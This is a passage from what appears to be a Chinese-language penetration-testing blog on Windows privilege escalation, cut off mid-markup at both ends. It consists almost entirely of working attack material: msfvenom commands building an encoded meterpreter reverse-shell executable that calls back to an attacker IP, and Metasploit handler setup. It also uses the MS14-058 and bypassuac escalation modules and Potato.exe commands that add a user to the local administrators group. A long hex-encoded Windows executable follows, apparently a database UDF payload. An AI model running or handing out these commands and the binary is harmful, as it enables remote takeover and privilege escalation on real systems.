class="hljs-regexp">/kali/</span>Desktop<span class="hljs-regexp">/tccc/m</span>s14058.exe监听上线msf6 exploit(windows<span class="hljs-regexp">/local/m</span>s14_058_track_popup_menu) &gt; use exploit<span class="hljs-regexp">/multi/</span>handlermsf6 exploit(multi<span class="hljs-regexp">/handler) &gt; set payload windows/m</span>eterpreter<span class="hljs-regexp">/reverse_tcpmsf6 exploit(multi/</span>handler) &gt; set lhost <span class="hljs-number">192.168</span>.<span class="hljs-number">229.129</span>msf6 exploit(multi<span class="hljs-regexp">/handler) &gt; set lport 7777msf6 exploit(multi/</span>handler) &gt; run上线后隐藏后台，并获取sessionbackgroundsessions –l利用ms14-<span class="hljs-number">058</span>提权use exploit<span class="hljs-regexp">/windows/</span>local/ms14_058_track_popup_menushow <span class="hljs-keyword">options</span><br></code></pre></td></tr></table></figure><h3 id="223-bupass-uac"><a class="markdownIt-Anchor" href="#223-bupass-uac"></a> 2.2.3 bupass UAC</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">msf6 &gt; search bypassuacmsfvenom -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp -e x64<span class="hljs-regexp">/shikata_ga_nai -i 5 lhost=192.168.229.129 lport=9865 -f exe &gt; /</span>home<span class="hljs-regexp">/kali/</span>Desktop<span class="hljs-regexp">/tccc/</span>lyshark.exemsf &gt; use exploit<span class="hljs-regexp">/multi/</span>handlermsf exploit(multi<span class="hljs-regexp">/handler) &gt; set payload windows/m</span>eterpreter<span class="hljs-regexp">/reverse_tcpset lhost 192.168.229.129set lport 9865exploitbackgroundsessions –l使用exploit/</span>windows<span class="hljs-regexp">/local/</span>bypassuac模块绕过uac为window提权。msf &gt;  use exploit<span class="hljs-regexp">/windows/</span>local/bypassuacmsf exploit(bypassuac) &gt; set session <span class="hljs-number">1</span>msf exploit(bypassuac) &gt; exploit<br></code></pre></td></tr></table></figure><h3 id="224-potato"><a class="markdownIt-Anchor" href="#224-potato"></a> 2.2.4 Potato</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-type">Potato</span>.exe <span class="hljs-operator">-</span>ip <span class="hljs-operator">&lt;</span>local_ip<span class="hljs-operator">&gt;</span> <span class="hljs-operator">-</span>cmd <span class="hljs-operator">&lt;</span>command_to_run<span class="hljs-operator">&gt;</span> <span class="hljs-operator">-</span>disable_exhaust truePotato.exe <span class="hljs-operator">-</span>ip <span class="hljs-number">192.168</span>.<span class="hljs-number">241.133</span> <span class="hljs-operator">-</span>disable_exhaust <span class="hljs-literal">true</span> <span class="hljs-operator">-</span>cmd <span class="hljs-string">&quot;C:<span class="hljs-subst">\\</span>Windows<span class="hljs-subst">\\</span>System32<span class="hljs-subst">\\</span>cmd.exe /C net localgroup administrators test1 /add&quot;</span> <span class="hljs-type">Potato</span>.exe <span class="hljs-operator">-</span>ip <span class="hljs-number">192.168</span>.<span class="hljs-number">229.144</span> <span class="hljs-operator">-</span>disable_exhaust <span class="hljs-literal">true</span> <span class="hljs-operator">-</span>cmd <span class="hljs-string">&quot;C:<span class="hljs-subst">\\</span>Windows<span class="hljs-subst">\\</span>System32<span class="hljs-subst">\\</span>cmd.exe /C net localgroup administrators test /add&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SELECT</span> <span class="hljs-number">0</span>x<span class="hljs-number">4</span>d<span class="hljs-number">5</span>a<span class="hljs-number">90000300000004000000</span>ffff<span class="hljs-number">0000</span>b<span class="hljs-number">800000000000000400000000000000000000000000000000000000000000000000000000000000000000000</span>f<span class="hljs-number">80000000</span>e<span class="hljs-number">1</span>fba<span class="hljs-number">0</span>e<span class="hljs-number">00</span>b<span class="hljs-number">409</span>cd<span class="hljs-number">21</span>b<span class="hljs-number">8014</span>ccd<span class="hljs-number">21546869732070726</span>f<span class="hljs-number">6772616</span>d<span class="hljs-number">2063616</span>e<span class="hljs-number">6</span>e<span class="hljs-number">6</span>f<span class="hljs-number">742062652072756</span>e<span class="hljs-number">20696</span>e<span class="hljs-number">20444</span>f<span class="hljs-number">53206</span>d<span class="hljs-number">6</span>f<span class="hljs-number">64652</span>e<span class="hljs-number">0</span>d<span class="hljs-number">0</span>d<span class="hljs-number">0</span>a<span class="hljs-number">24000000000000004</span>d<span class="hljs-number">477</span>bd<span class="hljs-number">0092615830926158309261583005</span>e<span class="hljs-number">86830</span>b<span class="hljs-number">261583005</span>e<span class="hljs-number">808308261583005</span>e<span class="hljs-number">968307261583005</span>e<span class="hljs-number">91830</span>b<span class="hljs-number">2615832</span>ee<span class="hljs-number">06</span>e<span class="hljs-number">830</span>a<span class="hljs-number">2615830926148325261583005</span>e<span class="hljs-number">9</span>c<span class="hljs-number">8308261583005</span>e<span class="hljs-number">878308261583005</span>e<span class="hljs-number">8483082615835269636809261583000000000000000000000000000000000000000000000000504500004</span>c<span class="hljs-number">0103004</span>afe<span class="hljs-number">9</span>f<span class="hljs-number">5</span>a<span class="hljs-number">0000000000000000</span>e<span class="hljs-number">00002210</span>b<span class="hljs-number">010900001000000010000000600000607</span>c<span class="hljs-number">0000007000000080000000000010001000000002000005000000000000000500000000000000009000000010000000000000020000000000100000100000000010000010000000000000100000007</span>c<span class="hljs-number">83000008020000</span>b<span class="hljs-number">4820000</span>c<span class="hljs-number">800000000800000</span>b<span class="hljs-number">402000000000000000000000000000000000000848500001000000000000000000000000000000000000000000000000000000000000000000000002</span>c<span class="hljs-number">7</span>e<span class="hljs-number">00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000600000001000000000000000040000000000000000000000000000800000</span>e<span class="hljs-number">0555058310000000000100000007000000010000000040000000000000000000000000000400000</span>e<span class="hljs-number">02</span>e<span class="hljs-number">7273726300000000100000008000000006000000140000000000000000000000000000400000</span>c<span class="hljs-number">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332</span>e<span class="hljs-number">393100555058210</span>d<span class="hljs-number">090208</span>b<span class="hljs-number">92</span>bcf<span class="hljs-number">11</span>b<span class="hljs-number">11</span>ceea<span class="hljs-number">24</span>f<span class="hljs-number">550000560</span>c<span class="hljs-number">000000220000260000</span>a<span class="hljs-number">8</span>ffffffff<span class="hljs-number">8</span>b<span class="hljs-number">4</span>c<span class="hljs-number">240833</span>c<span class="hljs-number">03901741656578</span>b<span class="hljs-number">7</span>c<span class="hljs-number">24146</span>a<span class="hljs-number">0</span>c<span class="hljs-number">59</span>be<span class="hljs-number">000010</span>dcf<span class="hljs-number">3</span>a<span class="hljs-number">566</span>a<span class="hljs-number">55</span>fb<span class="hljs-number">0015</span>e<span class="hljs-number">5</span>dfb<span class="hljs-number">77</span>fbc<span class="hljs-number">38</span>b<span class="hljs-number">44240</span>c<span class="hljs-number">1</span>a<span class="hljs-number">6</span>a<span class="hljs-number">071611108</span>bf<span class="hljs-number">8183218</span>ff<span class="hljs-number">63</span>db<span class="hljs-number">6</span>f<span class="hljs-number">1</span>ca<span class="hljs-number">45</span>fc<span class="hljs-number">7011</span>e<span class="hljs-number">1200210883380175128</span>b<span class="hljs-number">40040</span>df<span class="hljs-number">6776</span>f<span class="hljs-number">0700750</span>a<span class="hljs-number">1004</span>c<span class="hljs-number">6000132</span>c<span class="hljs-number">0</span>c<span class="hljs-number">3530</span>abf<span class="hljs-number">1</span>df<span class="hljs-number">68</span>d<span class="hljs-number">3</span>c<span class="hljs-number">3053</span>a<span class="hljs-number">454082</span>d<span class="hljs-number">08</span>ff<span class="hljs-number">30</span>ff<span class="hljs-number">15</span>fff<span class="hljs-number">6</span>ee<span class="hljs-number">776</span>c<span class="hljs-number">885985</span>c<span class="hljs-number">075085614</span>c<span class="hljs-number">601011</span>bc<span class="hljs-number">8568</span>d<span class="hljs-number">71018</span>a<span class="hljs-number">11</span>fd<span class="hljs-number">6</span>fdffe<span class="hljs-number">4184</span>d<span class="hljs-number">275</span>f<span class="hljs-number">98</span>b<span class="hljs-number">54142</span>bce<span class="hljs-number">890</span>a<span class="hljs-number">32558</span>bec<span class="hljs-number">8</span>b<span class="hljs-number">4</span>d<span class="hljs-number">0</span>c<span class="hljs-number">833902</span>b<span class="hljs-number">7</span>d<span class="hljs-number">860</span>bf<span class="hljs-number">5374148</span>b<span class="hljs-number">7</span>d<span class="hljs-number">10915</span>c<span class="hljs-number">5453</span>eb<span class="hljs-number">4</span>cbf<span class="hljs-number">9</span>dbddf<span class="hljs-number">8</span>b<span class="hljs-number">417</span>d<span class="hljs-number">740</span>f<span class="hljs-number">1</span>b<span class="hljs-number">707</span>c<span class="hljs-number">1</span>bebe<span class="hljs-number">5836004</span>dbb<span class="hljs-number">1</span>ffb<span class="hljs-number">7001</span>a<span class="hljs-number">0</span>c<span class="hljs-number">8</span>b<span class="hljs-number">48048</span>b<span class="hljs-number">008</span>d<span class="hljs-number">4401025072</span>a<span class="hljs-number">0594</span>c<span class="hljs-number">08</span>dfc<span class="hljs-number">8</span>d<span class="hljs-number">7</span>b<span class="hljs-number">5891678113006</span>a<span class="hljs-number">44</span>ceb<span class="hljs-number">6</span>c<span class="hljs-number">57</span>beb<span class="hljs-number">7</span>b<span class="hljs-number">2</span>b<span class="hljs-number">85</span>f<span class="hljs-number">5</span>e<span class="hljs-number">5</span>da<span class="hljs-number">30421740833</span>dbb<span class="hljs-number">63</span>ff<span class="hljs-number">6</span>a<span class="hljs-number">8591353568</span>b<span class="hljs-number">742410</span>d<span class="hljs-number">878534602</span>db<span class="hljs-number">85</span>db<span class="hljs-number">5</span>bb<span class="hljs-number">6460851</span>c<span class="hljs-number">78</span>d<span class="hljs-number">5</span>c<span class="hljs-number">4257</span>e<span class="hljs-number">8240</span>b<span class="hljs-number">75</span>eeeebfe<span class="hljs-number">01400</span>c<span class="hljs-number">604070008</span>ff<span class="hljs-number">70041</span>e<span class="hljs-number">0553</span>b<span class="hljs-number">1</span>db<span class="hljs-number">1</span>b<span class="hljs-number">921</span>a<span class="hljs-number">22</span>c<span class="hljs-number">418535720030054090</span>f<span class="hljs-number">09</span>b<span class="hljs-number">7086</span>a<span class="hljs-number">995</span>b<span class="hljs-number">0</span>f<span class="hljs-number">98599954</span>cf<span class="hljs-number">2</span>d<span class="hljs-number">343713</span>b<span class="hljs-number">8</span>f<span class="hljs-number">4540</span>b<span class="hljs-number">1</span>edeb<span class="hljs-number">60</span>d<span class="hljs-number">818403552251519</span>d<span class="hljs-number">35</span>dffed<span class="hljs-number">6</span>fedf<span class="hljs-number">576800</span>f<span class="hljs-number">762</span>d<span class="hljs-number">66</span>a<span class="hljs-number">018945</span>fc<span class="hljs-number">068</span>bf<span class="hljs-number">08</span>b<span class="hljs-number">4560</span>dd<span class="hljs-number">7</span>ff<span class="hljs-number">70</span>cc<span class="hljs-number">606004533</span>ff<span class="hljs-number">595939387471683</span>cc<span class="hljs-number">071</span>c<span class="hljs-number">6</span>fedfda<span class="hljs-number">9</span>c<span class="hljs-number">12260</span>c<span class="hljs-number">3</span>bc<span class="hljs-number">7745</span>b<span class="hljs-number">506</span>a<span class="hljs-number">04</span>ff<span class="hljs-number">75</span>fc<span class="hljs-number">149073</span>e<span class="hljs-number">1</span>edd<span class="hljs-number">7</span>a<span class="hljs-number">9</span>fd<span class="hljs-number">48533</span>afc<span class="hljs-number">8</span>d<span class="hljs-number">48911040</span>b<span class="hljs-number">963</span>dbff<span class="hljs-number">2</span>bc<span class="hljs-number">18</span>bd<span class="hljs-number">88</span>d<span class="hljs-number">043</span>b<span class="hljs-number">505630</span>f<span class="hljs-number">8268</span>c<span class="hljs-number">5330</span>d<span class="hljs-number">8</span>ad<span class="hljs-number">8</span>dbd<span class="hljs-number">5</span>f<span class="hljs-number">03</span>fe<span class="hljs-number">570</span>e<span class="hljs-number">940</span>de<span class="hljs-number">57</span>df<span class="hljs-number">8463</span>fe<span class="hljs-number">6364</span>c<span class="hljs-number">2066</span>ba<span class="hljs-number">5</span>b<span class="hljs-number">1810</span>a<span class="hljs-number">4803</span>e<span class="hljs-number">0059169</span>eb<span class="hljs-number">0</span>ff<span class="hljs-number">741</span>a<span class="hljs-number">8</span>bc<span class="hljs-number">6</span>c<span class="hljs-number">64437</span>ff<span class="hljs-number">00594</span>d<span class="hljs-number">1489</span>c<span class="hljs-number">906987</span>bebd<span class="hljs-number">86</span>f<span class="hljs-number">183</span>e<span class="hljs-number">5</span>f<span class="hljs-number">205</span>ec<span class="hljs-number">9</span>c<span class="hljs-number">3</span>eed<span class="hljs-number">7</span>b<span class="hljs-number">235</span>dcbaf<span class="hljs-number">37</span>d<span class="hljs-number">574708</span>c<span class="hljs-number">45030087</span>bdbdacdc<span class="hljs-number">9</span>c<span class="hljs-number">26</span>a<span class="hljs-number">4078</span>c<span class="hljs-number">710548</span>d<span class="hljs-number">4601</span>b<span class="hljs-number">9</span>e<span class="hljs-number">07</span>e<span class="hljs-number">614251724</span>f<span class="hljs-number">0856</span>ff<span class="hljs-number">31</span>cf<span class="hljs-number">6</span>bafdd<span class="hljs-number">9</span>db<span class="hljs-number">694</span>c<span class="hljs-number">66</span>aff<span class="hljs-number">8</span>dc<span class="hljs-number">32082</span>f<span class="hljs-number">63</span>a<span class="hljs-number">58</span>b<span class="hljs-number">0</span>b<span class="hljs-number">6030</span>d<span class="hljs-number">092</span>c<span class="hljs-number">23005</span>f<span class="hljs-number">7</span>cc<span class="hljs-number">36</span>e<span class="hljs-number">57036</span>c<span class="hljs-number">6</span>a<span class="hljs-number">081</span>d<span class="hljs-number">1290</span>ac<span class="hljs-number">0</span>aa<span class="hljs-number">88365</span>fc<span class="hljs-number">2</span>f<span class="hljs-number">6</span>c<span class="hljs-number">2</span>f<span class="hljs-number">2</span>c<span class="hljs-number">2</span>d<span class="hljs-number">4592</span>d<span class="hljs-number">0</span>eb<span class="hljs-number">071</span>b<span class="hljs-number">408</span>f<span class="hljs-number">65</span>e<span class="hljs-number">8</span>c<span class="hljs-number">70</span>bbfd<span class="hljs-number">66</span>e<span class="hljs-number">42</span>feff<span class="hljs-number">000</span>d<span class="hljs-number">1</span>fedc<span class="hljs-number">25</span>e<span class="hljs-number">3</span>bffdb<span class="hljs-number">17</span>b<span class="hljs-number">60</span>d<span class="hljs-number">08209</span>a<span class="hljs-number">02</span>f<span class="hljs-number">3</span>c<span class="hljs-number">3</span>e<span class="hljs-number">90806</span>f<span class="hljs-number">58</span>bff<span class="hljs-number">56688000002</span>d<span class="hljs-number">8</span>c<span class="hljs-number">6</span>d<span class="hljs-number">675880985608845</span>aa<span class="hljs-number">3</span>bde<span class="hljs-number">0</span>febb<span class="hljs-number">062358045485</span>f<span class="hljs-number">675054</span>daa<span class="hljs-number">83260076</span>fbb<span class="hljs-number">7</span>db<span class="hljs-number">4508</span>c<span class="hljs-number">36</span>f<span class="hljs-number">08</span>ed<span class="hljs-number">09</span>acc<span class="hljs-number">704240607</span>ff<span class="hljs-number">0</span>b<span class="hljs-number">4</span>c<span class="hljs-number">113637598</span>d<span class="hljs-number">71</span>ffcf<span class="hljs-number">9</span>c<span class="hljs-number">0</span>bbf<span class="hljs-number">77</span>dfc<span class="hljs-number">9750</span>e<span class="hljs-number">39056</span>b<span class="hljs-number">107</span>e<span class="hljs-number">3</span>cff<span class="hljs-number">7310830</span>b<span class="hljs-number">01</span>fbeec<span class="hljs-number">6</span>bb<span class="hljs-number">8</span>b<span class="hljs-number">0910548</span>b<span class="hljs-number">098</span>f<span class="hljs-number">57890</span>a<span class="hljs-number">23480</span>f<span class="hljs-number">85</span>d<span class="hljs-number">47</span>d<span class="hljs-number">618</span>cbbad<span class="hljs-number">641718068</span>b<span class="hljs-number">79040838071</span>b<span class="hljs-number">76</span>edeebb<span class="hljs-number">1</span>e<span class="hljs-number">50</span>eb<span class="hljs-number">184</span>aa<span class="hljs-number">705</span>b<span class="hljs-number">8</span>e<span class="hljs-number">61768</span>b<span class="hljs-number">0</span>b<span class="hljs-number">030</span>d<span class="hljs-number">8</span>e<span class="hljs-number">803</span>a<span class="hljs-number">83</span>c<span class="hljs-number">0957</span>c<span class="hljs-number">1</span>d<span class="hljs-number">6</span>bbaeb<span class="hljs-number">5</span>d<span class="hljs-number">6</span>a<span class="hljs-number">1</span>e<span class="hljs-number">7</span>e<span class="hljs-number">9</span>e<span class="hljs-number">2573</span>ca<span class="hljs-number">12</span>f<span class="hljs-number">4</span>c<span class="hljs-number">6</span>a<span class="hljs-number">6</span>ff<span class="hljs-number">777</span>c<span class="hljs-number">3025</span>efd<span class="hljs-number">096</span>a<span class="hljs-number">1</span>fee<span class="hljs-number">76</span>eb<span class="hljs-number">3</span>caa<span class="hljs-number">10</span>c<span class="hljs-number">80475</span>ed<span class="hljs-number">7</span>befc<span class="hljs-number">0</span>c<span class="hljs-number">7051</span>f<span class="hljs-number">281</span>a<span class="hljs-number">70</span>e<span class="hljs-number">027071</span>bdff<span class="hljs-number">79</span>d<span class="hljs-number">5</span>cb<span class="hljs-number">520</span>bc<span class="hljs-number">04</span>b<span class="hljs-number">81</span>b<span class="hljs-number">6</span>a<span class="hljs-number">5635</span>b<span class="hljs-number">952</span>eb<span class="hljs-number">782</span>b<span class="hljs-number">7339</span>b<span class="hljs-number">2</span>e<span class="hljs-number">3696</span>ff<span class="hljs-number">7</span>defd<span class="hljs-number">7340393</span>d<span class="hljs-number">155</span>c<span class="hljs-number">741</span>c<span class="hljs-number">68062809</span>ac<span class="hljs-number">43</span>db<span class="hljs-number">6</span>b<span class="hljs-number">85850</span>d<span class="hljs-number">9</span>e<span class="hljs-number">1034252316</span>ffe<span class="hljs-number">666</span>f<span class="hljs-number">862</span>f<span class="hljs-number">154</span>b<span class="hljs-number">201</span>dc<span class="hljs-number">0801592</span>cc<span class="hljs-number">2</span>b<span class="hljs-number">1</span>a<span class="hljs-number">1</span>db<span class="hljs-number">78049</span>ddfdbf<span class="hljs-number">62413</span>d<span class="hljs-number">90</span>fd<span class="hljs-number">4</span>fc<span class="hljs-number">83</span>f<span class="hljs-number">80266</span>b<span class="hljs-number">16</span>f<span class="hljs-number">6</span>cb<span class="hljs-number">0</span>d<span class="hljs-number">2595</span>bffa<span class="hljs-number">0584</span>b<span class="hljs-number">77783</span>bb<span class="hljs-number">5783106350</span>f<span class="hljs-number">8487</span>c<span class="hljs-number">71996</span>ee<span class="hljs-number">4</span>cd<span class="hljs-number">3543</span>bf<span class="hljs-number">81810897</span>d<span class="hljs-number">82</span>efc<span class="hljs-number">796</span>be<span class="hljs-number">35</span>fac<span class="hljs-number">87251833</span>f<span class="hljs-number">8</span>af<span class="hljs-number">36</span>a<span class="hljs-number">7</span>c<span class="hljs-number">398587</span>b<span class="hljs-number">4</span>f<span class="hljs-number">10774</span>e<span class="hljs-number">9</span>ffc<span class="hljs-number">8</span>d<span class="hljs-number">60</span>f<span class="hljs-number">7</span>c<span class="hljs-number">89</span>c<span class="hljs-number">5</span>db<span class="hljs-number">9</span>bb<span class="hljs-number">5</span>d<span class="hljs-number">955</span>f<span class="hljs-number">85615441</span>b<span class="hljs-number">474</span>ded<span class="hljs-number">5</span>be<span class="hljs-number">38</span>ef<span class="hljs-number">88</span>a<span class="hljs-number">394</span>d<span class="hljs-number">1003</span>d<span class="hljs-number">00874</span>b<span class="hljs-number">48909437</span>aa<span class="hljs-number">36</span>d<span class="hljs-number">020</span>c<span class="hljs-number">1</span>ad<span class="hljs-number">3</span>f<span class="hljs-number">8</span>eba<span class="hljs-number">71</span>c<span class="hljs-number">3162</span>cc<span class="hljs-number">5</span>a<span class="hljs-number">64442</span>e<span class="hljs-number">386161</span>fb<span class="hljs-number">0</span>a<span class="hljs-number">58064</span>c<span class="hljs-number">32</span>fc<span class="hljs-number">19503</span>f<span class="hljs-number">1</span>bdf<span class="hljs-number">720443375</span>bc<span class="hljs-number">9</span>c<span class="hljs-number">20</span>cc<span class="hljs-number">710</span>fb<span class="hljs-number">02231</span>fb<span class="hljs-number">2288</span>b<span class="hljs-number">2</span>ef<span class="hljs-number">28</span>b<span class="hljs-number">5</span>d<span class="hljs-number">081</span>cae<span class="hljs-number">0</span>fdb<span class="hljs-number">9</span>b<span class="hljs-number">54</span>e<span class="hljs-number">433</span>c<span class="hljs-number">95</span>cfc<span class="hljs-number">7</span>d<span class="hljs-number">2008016</span>c<span class="hljs-number">2</span>dc<span class="hljs-number">6</span>c<span class="hljs-number">23</span>bf<span class="hljs-number">15</span>a<span class="hljs-number">393</span>a<span class="hljs-number">4417</span>e<span class="hljs-number">4</span>d<span class="hljs-number">61</span>bfe<span class="hljs-number">7</span>fafae<span class="hljs-number">3</span>bf<span class="hljs-number">0740583</span>fe<span class="hljs-number">02752</span>e<span class="hljs-number">1910</span>d<span class="hljs-number">03</span>bc<span class="hljs-number">1</span>e<span class="hljs-number">7166</span>eb<span class="hljs-number">8</span>ed<span class="hljs-number">57565</span>fd<span class="hljs-number">03</span>b<span class="hljs-number">5</span>ee<span class="hljs-number">40003937</span>b<span class="hljs-number">703</span>b<span class="hljs-number">67115</span>a<span class="hljs-number">039614168012376</span>c<span class="hljs-number">7</span>d<span class="hljs-number">270</span>a<span class="hljs-number">8227</span>fea<span class="hljs-number">0246420575062</span>b<span class="hljs-number">30</span>d<span class="hljs-number">661327002</span>f<span class="hljs-number">527</span>f<span class="hljs-number">8</span>df<span class="hljs-number">61</span>ad<span class="hljs-number">2061153</span>f<span class="hljs-number">76</span>a<span class="hljs-number">037543</span>b<span class="hljs-number">067</span>bb<span class="hljs-number">614</span>f<span class="hljs-number">34032168742</span>e<span class="hljs-number">2</span>c<span class="hljs-number">0</span>d<span class="hljs-number">2</span>c<span class="hljs-number">3</span>cec<span class="hljs-number">257</span>feb<span class="hljs-number">1</span>b<span class="hljs-number">71</span>ec<span class="hljs-number">5</span>a<span class="hljs-number">09706</span>a<span class="hljs-number">7</span>c<span class="hljs-number">6</span>faae<span class="hljs-number">05051597</span>c<span class="hljs-number">64825</span>d<span class="hljs-number">900</span>eadf<span class="hljs-number">62</span>ffa<span class="hljs-number">8</span>a<span class="hljs-number">19066</span>b<span class="hljs-number">8</span>f<span class="hljs-number">91</span>b<span class="hljs-number">6</span>c<span class="hljs-number">72</span>ae<span class="hljs-number">490</span>c<span class="hljs-number">396</span>ec<span class="hljs-number">1640</span>e<span class="hljs-number">134</span>a<span class="hljs-number">9</span>ff<span class="hljs-number">3</span>b<span class="hljs-number">246</span>abb<span class="hljs-number">41</span>c<span class="hljs-number">1</span>f<span class="hljs-number">17926547</span>dbc<span class="hljs-number">550</span>c<span class="hljs-number">0</span>d<span class="hljs-number">381</span>e<span class="hljs-number">33</span>bc<span class="hljs-number">05</span>bc<span class="hljs-number">595</span>d<span class="hljs-number">382281</span>ec<span class="hljs-number">2832</span>f<span class="hljs-number">7869</span>f<span class="hljs-number">365</span>f<span class="hljs-number">212043211</span>c<span class="hljs-number">895</span>e<span class="hljs-number">2118891</span>d<span class="hljs-number">05</span>f<span class="hljs-number">78</span>ec<span class="hljs-number">243143</span>c<span class="hljs-number">21</span>a<span class="hljs-number">2</span>aa<span class="hljs-number">210</span>c<span class="hljs-number">668</span>c<span class="hljs-number">186</span>c<span class="hljs-number">5</span>ffbda<span class="hljs-number">3806252</span>c<span class="hljs-number">0620080605</span>dd<span class="hljs-number">2</span>dcdd<span class="hljs-number">20425002</span>d<span class="hljs-number">7</span>ffc<span class="hljs-number">9</span>c<span class="hljs-number">8</span>f<span class="hljs-number">7</span>ab<span class="hljs-number">6</span>b<span class="hljs-number">1</span>f<span class="hljs-number">6143095562407042831</span>d<span class="hljs-number">6</span>fedb<span class="hljs-number">7</span>f<span class="hljs-number">0807348</span>b<span class="hljs-number">85</span>e<span class="hljs-number">0</span>fca<span class="hljs-number">0</span>aa<span class="hljs-number">701</span>ddbb<span class="hljs-number">5</span>b<span class="hljs-number">395011</span>c<span class="hljs-number">1920241318092</span>b<span class="hljs-number">18476</span>a<span class="hljs-number">565</span>f<span class="hljs-number">201</span>cb<span class="hljs-number">360</span>c<span class="hljs-number">32</span>c<span class="hljs-number">9</span>f<span class="hljs-number">7</span>b<span class="hljs-number">8985</span>d<span class="hljs-number">8320</span>a<span class="hljs-number">04</span>dc<span class="hljs-number">03</span>b<span class="hljs-number">557</span>e<span class="hljs-number">01</span>b<span class="hljs-number">243468</span>dedfd<span class="hljs-number">1</span>f<span class="hljs-number">7</span>d<span class="hljs-number">8</span>d<span class="hljs-number">360</span>ce<span class="hljs-number">2879</span>d<span class="hljs-number">40</span>a<span class="hljs-number">2</span>c<span class="hljs-number">833</span>d<span class="hljs-number">208</span>dbdc<span class="hljs-number">3</span>da<span class="hljs-number">00</span>f<span class="hljs-number">923685</span>b<span class="hljs-number">1</span>b<span class="hljs-number">300</span>bdfaf<span class="hljs-number">67</span>f<span class="hljs-number">534</span>c<span class="hljs-number">97</span>f<span class="hljs-number">23401</span>ec<span class="hljs-number">25</span>f<span class="hljs-number">6</span>a<span class="hljs-number">4849918</span>f<span class="hljs-number">144</span>a<span class="hljs-number">50152</span>e<span class="hljs-number">9</span>df<span class="hljs-number">458</span>aaf<span class="hljs-number">8</span>a<span class="hljs-number">29</span>c<span class="hljs-number">10</span>f<span class="hljs-number">3</span>eb<span class="hljs-number">67611</span>c<span class="hljs-number">7</span>e<span class="hljs-number">052</span>c<span class="hljs-number">37</span>d<span class="hljs-number">4598</span>feded<span class="hljs-number">8321</span>b<span class="hljs-number">9273551</span>e<span class="hljs-number">0</span>f<span class="hljs-number">5</span>ee<span class="hljs-number">3</span>bdc<span class="hljs-number">0</span>abf<span class="hljs-number">03</span>e<span class="hljs-number">4507</span>f<span class="hljs-number">4</span>b<span class="hljs-number">8417185</span>bdb<span class="hljs-number">7</span>e<span class="hljs-number">600</span>bce<span class="hljs-number">1</span>cdc<span class="hljs-number">142</span>cd<span class="hljs-number">6</span>e<span class="hljs-number">288</span>b<span class="hljs-number">154</span>b<span class="hljs-number">609</span>e<span class="hljs-number">01</span>b<span class="hljs-number">14</span>f<span class="hljs-number">413160</span>a<span class="hljs-number">4</span>bdb<span class="hljs-number">313</span>ddcdbffdc<span class="hljs-number">84676</span>cc<span class="hljs-number">859</span>d<span class="hljs-number">94</span>e<span class="hljs-number">1</span>e<span class="hljs-number">07</span>f<span class="hljs-number">7</span>d<span class="hljs-number">81</span>bf<span class="hljs-number">076</span>bbb<span class="hljs-number">7</span>c<span class="hljs-number">00359485</span>d<span class="hljs-number">1656</span>b<span class="hljs-number">8</span>bc<span class="hljs-number">18</span>be<span class="hljs-number">04</span>a<span class="hljs-number">3638</span>b<span class="hljs-number">6</span>f<span class="hljs-number">2</span>af<span class="hljs-number">83</span>bc<span class="hljs-number">673080753025073</span>d<span class="hljs-number">85</span>f<span class="hljs-number">60835</span>a<span class="hljs-number">3</span>bfe<span class="hljs-number">72</span>f<span class="hljs-number">15</span>f<span class="hljs-number">5</span>e<span class="hljs-number">25206</span>c<span class="hljs-number">6053</span>c<span class="hljs-number">820</span>cc<span class="hljs-number">006</span>f<span class="hljs-number">35</span>b<span class="hljs-number">4</span>dd<span class="hljs-number">452</span>bb<span class="hljs-number">84</span>d<span class="hljs-number">5</span>a<span class="hljs-number">346627040</span>b<span class="hljs-number">85</span>bf<span class="hljs-number">2</span>b<span class="hljs-number">5</span>e<span class="hljs-number">6</span>e<span class="hljs-number">413</span>c<span class="hljs-number">03</span>c<span class="hljs-number">1813850</span>e<span class="hljs-number">45</span>fefa<span class="hljs-number">5</span>ecfffb<span class="hljs-number">33</span>d<span class="hljs-number">2</span>b<span class="hljs-number">90</span>b<span class="hljs-number">011</span>c<span class="hljs-number">48180</span>f<span class="hljs-number">94</span>c<span class="hljs-number">28</span>bc<span class="hljs-number">25</span>dc<span class="hljs-number">33</span>fb<span class="hljs-number">702</span>bf<span class="hljs-number">35</span>e<span class="hljs-number">34831</span>c<span class="hljs-number">80</span>fb<span class="hljs-number">74114</span>ae<span class="hljs-number">057106</span>c<span class="hljs-number">1</span>a<span class="hljs-number">55</span>b<span class="hljs-number">6</span>c<span class="hljs-number">33578</span>c<span class="hljs-number">081817761</span>bffff<span class="hljs-number">2</span>ff<span class="hljs-number">1</span>d<span class="hljs-number">7487</span>bf<span class="hljs-number">972098</span>b<span class="hljs-number">580803</span>d<span class="hljs-number">93</span>bfb<span class="hljs-number">720</span>a<span class="hljs-number">4283</span>c<span class="hljs-number">0283</span>bd<span class="hljs-number">67270</span>ca<span class="hljs-number">36</span>b<span class="hljs-number">5</span>e<span class="hljs-number">86</span>ae<span class="hljs-number">55</span>dc<span class="hljs-number">38</span>f<span class="hljs-number">6</span>afef<span class="hljs-number">0</span>cd<span class="hljs-number">71</span>f<span class="hljs-number">7</span>a<span class="hljs-number">970040</span>b<span class="hljs-number">056418005083</span>ec<span class="hljs-number">080</span>db<span class="hljs-number">7</span>c<span class="hljs-number">670082</span>f<span class="hljs-number">316</span>c<span class="hljs-number">33</span>c<span class="hljs-number">576</span>f<span class="hljs-number">0852</span>f<span class="hljs-number">06</span>df<span class="hljs-number">64</span>a<span class="hljs-number">31</span>a<span class="hljs-number">89</span>b<span class="hljs-number">90968555</span>db<span 